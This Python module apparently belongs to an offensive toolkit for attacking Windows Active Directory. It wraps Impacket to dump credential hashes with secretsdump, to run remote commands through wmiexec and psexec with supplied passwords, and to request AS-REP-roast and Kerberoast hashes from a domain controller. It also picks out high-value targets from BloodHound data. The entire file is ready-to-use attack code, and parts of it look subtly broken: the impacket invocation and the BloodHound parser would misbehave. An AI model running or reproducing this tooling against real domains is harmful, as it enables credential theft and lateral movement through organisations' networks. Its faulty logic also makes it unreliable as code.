import os
import subprocess
import json
import shutil
import tempfile
import logging
from typing import Optional

logger = logging.getLogger("ad_toolkit")

IMPACKET_SCRIPTS = {
    "secretsdump": "secretsdump.py",
    "wmiexec": "wmiexec.py",
    "psexec": "psexec.py",
    "smbexec": "smbexec.py",
    "atexec": "atexec.py",
    "dcomexec": "dcomexec.py",
    "GetNPUsers": "GetNPUsers.py",
    "GetUserSPNs": "GetUserSPNs.py",
    "ticketer": "ticketer.py",
    "rpcdump": "rpcdump.py",
    "lookupsid": "lookupsid.py",
}


class ADToolkit:
    def __init__(self):
        self._impacket_prefix = self._find_impacket()

    def _find_impacket(self) -> list[str]:
        for base in ["/usr/bin", "/usr/local/bin", os.path.expanduser("~/.local/bin")]:
            for script in IMPACKET_SCRIPTS.values():
                path = os.path.join(base, script)
                if os.path.exists(path):
                    return [path.replace(script, "").rstrip("/")] if base else []
        try:
            r = subprocess.run(["python3", "-c", "import impacket; print(impacket.__file__)"],
                             capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                return ["python3", "-m"]
        except Exception:
            pass
        return []

    @property
    def has_impacket(self) -> bool:
        return len(self._impacket_prefix) > 0

    def _run_impacket(self, script: str, args: list[str],
                      proxy_env: Optional[dict] = None,
                      timeout: int = 120) -> dict:
        script_cmd = f"{script}.py" if self._impacket_prefix == ["python3", "-m"] else script
        if self._impacket_prefix == ["python3", "-m"]:
            cmd = ["python3", "-m", "impacket", script_cmd] + args
        elif len(self._impacket_prefix) == 1:
            cmd = [os.path.join(self._impacket_prefix[0], script_cmd)] + args
        else:
            cmd = self._impacket_prefix + [script_cmd] + args

        env = {**os.environ, **(proxy_env or {})}
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=env)
            return {
                "success": r.returncode == 0,
                "stdout": r.stdout[:5000],
                "stderr": r.stderr[:2000],
                "returncode": r.returncode,
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": f"timed out ({timeout}s)"}
        except FileNotFoundError:
            return {"success": False, "error": f"impacket script {script} not found"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def secretsdump(self, target: str, username: str = "", domain: str = "",
                    hash: str = "", use_kcc: bool = False,
                    proxy_env: Optional[dict] = None) -> dict:
        args = []
        if use_kcc:
            args.append("-k")
        if hash:
            args.extend(["-hashes", hash])
        auth = f"{domain}/{username}" if domain else username
        args.append(f"{auth}@{target}")
        result = self._run_impacket("secretsdump", args, proxy_env, timeout=300)
        hashes = []
        for line in (result.get("stdout", "") + result.get("stderr", "")).split("\n"):
            if ":" in line and line.count(":") >= 3 and not line.startswith("[") and not line.startswith(" "):
                hashes.append(line.strip())
        result["hashes_extracted"] = len(hashes)
        result["hashes"] = hashes[:50]
        return result

    def wmiexec(self, target: str, username: str, password: str = "",
                domain: str = "", command: str = "whoami",
                proxy_env: Optional[dict] = None) -> dict:
        auth = f"{domain}/{username}:{password}" if domain else f"{username}:{password}"
        args = [auth, target, command]
        return self._run_impacket("wmiexec", args, proxy_env, timeout=60)

    def psexec(self, target: str, username: str, password: str = "",
               domain: str = "", command: str = "whoami",
               proxy_env: Optional[dict] = None) -> dict:
        auth = f"{domain}/{username}:{password}" if domain else f"{username}:{password}"
        args = [auth, target, command]
        return self._run_impacket("psexec", args, proxy_env, timeout=60)

    def get_np_users(self, domain: str, dc_ip: str,
                     proxy_env: Optional[dict] = None) -> dict:
        result = self._run_impacket("GetNPUsers", ["-dc-ip", dc_ip, "-request", domain], proxy_env, timeout=60)
        users = []
        for line in (result.get("stdout", "") + result.get("stderr", "")).split("\n"):
            if "$krb5asrep$" in line or "$" not in line.strip() and "@" in line:
                if line.strip():
                    users.append(line.strip())
        result["asrep_users"] = users
        return result

    def get_user_spns(self, domain: str, dc_ip: str, username: str = "",
                      password: str = "", proxy_env: Optional[dict] = None) -> dict:
        auth = f"{domain}/{username}:{password}" if username else domain
        result = self._run_impacket("GetUserSPNs", ["-dc-ip", dc_ip, "-request", auth], proxy_env, timeout=60)
        spns = []
        current_spn = None
        for line in (result.get("stdout", "") + result.get("stderr", "")).split("\n"):
            if "ServicePrincipalName" in line or "/" in line and "@" in line:
                spns.append(line.strip())
        result["spns"] = spns
        return result

    def analyze_bloodhound(self, json_dir: str) -> dict:
        paths = []
        try:
            import glob
            for f in glob.glob(os.path.join(json_dir, "*.json")):
                with open(f) as fh:
                    data = json.load(fh)
                    for node in data.get("nodes", []):
                        for prop in node.get("properties", {}):
                            if prop.get("highvalue"):
                                paths.append({
                                    "object": prop.get("name"),
                                    "type": prop.get("type"),
                                    "reason": prop.get("reason", "high value target"),
                                })
            return {"attack_paths": paths}
        except Exception as e:
            return {"error": str(e)}


_toolkit: Optional[ADToolkit] = None


def get_ad_toolkit() -> ADToolkit:
    global _toolkit
    if _toolkit is None:
        _toolkit = ADToolkit()
    return _toolkit
